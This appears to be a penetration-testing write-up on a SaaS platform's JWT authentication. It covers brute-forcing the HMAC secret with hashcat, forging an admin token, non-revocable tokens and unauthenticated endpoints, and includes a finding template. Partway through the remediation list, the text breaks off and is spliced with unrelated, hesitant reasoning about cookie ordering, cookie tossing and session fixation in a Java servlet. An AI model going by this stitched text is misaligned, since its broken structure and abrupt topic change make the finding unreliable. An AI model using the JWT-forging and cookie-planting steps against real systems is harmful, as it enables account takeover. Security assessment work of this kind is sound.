SaaS Platform API Authentication Assessment\n\n**Context**: A SaaS platform uses JWT tokens for API authentication. The JWT is issued upon login and used for all subsequent API calls. A refresh token mechanism is also implemented.\n\n**Approach**:\n1. Authenticate and capture the JWT: algorithm is HS256, expiration is 7 days, payload contains user role\n2. Test alg:none bypass: server rejects the token (secure)\n3. Brute force the HMAC secret: discover the secret is \"company-jwt-secret-2023\" (found using hashcat with custom wordlist)\n4. Forge a JWT with admin role using the discovered secret: gain admin access to all endpoints\n5. Test token revocation: tokens remain valid after logout and password change (no blacklist)\n6. Test refresh token: refresh token has no expiration and can be reused indefinitely\n7. Find that the password reset endpoint returns different messages for valid vs invalid emails\n8. Discover that the `/health` and `/metrics` endpoints are accessible without authentication\n\n**Pitfalls**:\n- Only testing the login endpoint and missing authentication weaknesses in password reset, MFA, and token refresh flows\n- Not checking if the JWT secret is the same across all environments (dev, staging, production)\n- Ignoring the token lifetime: a 7-day JWT with no revocation means a stolen token is valid for a week\n- Not testing for token leakage in server logs, URL parameters, or error messages\n\n## Output Format\n\n```\n## Finding: JWT HMAC Secret Brute-Forceable and Token Not Revocable\n\n**ID**: API-AUTH-001\n**Severity**: Critical (CVSS 9.1)\n**OWASP API**: API2:2023 - Broken Authentication\n**Affected Components**:\n  - POST /api/v1/auth/login (token issuance)\n  - All authenticated endpoints (token validation)\n  - POST /api/v1/auth/logout (ineffective)\n\n**Description**:\nThe API uses HS256-signed JWT tokens with a brute-forceable secret\n(\"company-jwt-secret-2023\"). Use a cryptographically random secret of at least 256 bits if HMAC must be used\n3. Implement token blacklisting using Redis for logout and password change events\n4. The code takes the last → \"planted-by-another-path\" → 401 because it isn't a live session. The test therefore only proves that the *last* value is used and the planted value happens not to resolve. The Javadoc in AuthenticatedSessionServlet claims \"Either way the outcome is fail-closed: a request carrying two different values for the same name does not resolve to a session\" — this is only true because the *attacker-chosen* value isn't a live session id. \n\nThe real risk direction: if the attacker plants the value at a narrower path and the container/browser orders it LAST, then... the app would use the planted value which isn't live → 401, harmless (DoS on self). The dangerous direction is the reverse: the app's own Path=/ cookie is last (per RFC 6265 ordering) → app's real session used → the planted cookie is ignored. That means a *subdomain attacker who can plant a narrower-path cookie* can't hijack, but they also can't defend. Hmm.\n\nBut actually the real vulnerability direction for cookie shadowing: an attacker who controls a subdomain can plant a cookie for the parent domain with `Domain=parent` and narrower path. Here the app cookie is host-only (no Domain) — so a subdomain-planted cookie with `Domain=example.com` would be a *different* cookie and could shadow. But the app picks the last (longest-path-first ordering → shortest path last = the host-only Path=/). Wait, RFC 6265 ordering: cookies with the same name sorted by creation time, and \"longer path first\". So narrower-path cookie comes first, app's Path=/ last. Taking last = app's own. Correct, as documented.\n\nHowever, an attacker controlling a subdomain could plant `Domain=example.com; Path=/` too, with the same path — then ordering is by creation time (older first), so the attacker's newer cookie would be... RFC 6265 §5.4: sort by creation time ascending, then stable-sort by path length descending. So among same path, the *older* cookie comes first, newer later. Attacker's planted cookie is newer → placed LAST → the app would use the ATTACKER's value. But an attacker-chosen value gives them nothing (it resolves to no session). Hmm — it lets them cause a 401 for the victim (logout DoS). Not privilege escalation.\n\nActually, the truly dangerous variant of cookie-bombing/shadowing is when the app trusts *first* and the attacker plants a *known live* session id of their own → victim gets bound to attacker's session (session fixation via cookie shadowing). Here taking the LAST protects against that (assuming RFC ordering). So the design is defensible.\n\nSo: is this a finding? The behavior is a *robustness* weakness: it silently depends on container cookie ordering (Tomcat returns `request.getCookies()` in header order, which for a raw/crafted header the attacker fully controls). If an attacker sends `Cookie: APPSESSION=<their own live session>; APPSESSION=<victim's>` in an order where the victim's is last, then... the code takes victim's. Attacker gains nothing. If the attacker orders their own last and victim's first — the request resolves to the attacker's session. Who's making the request? The attacker themselves. Nothing gained.\n\nThe scenario that matters is *victim's browser* making the request — browser always follows RFC ordering, so app's own cookie is last (unless attacker plants a same-path newer cookie). Same-path same-name newer cookie from a subdomain → attacker plants *their own live session id* → victim's browser sends planted first (creation time ascending: victim's older → first; attacker's newer → last) → app takes LAST = attacker's session id → victim is now viewing the ATTACKER's session. That is classic cookie-tossing / session fixation via subdomain (CWE-384). But requires: (a) attacker controls a subdomain of the registrable domain, (b) can set a cookie with Domain=example.com;Path=/. And the app's own mitigation \"no Domain attribute\" doesn't prevent *inbound* planting. Hmm, and the ordering claim (\"last entry wins, which is the broadest path and therefore the one this application itself set\") is only an assumption.\n\nIs this worth reporting? It's a genuine, documented-assumption-dependent weakness in session resolution — \"Cookie tossing / cookie bomb\" is a recognized issue. I'd report it as a Low–Medium: CWE-384 (Session Fixation) or CWE-20 improper input validation for duplicate cookie names.
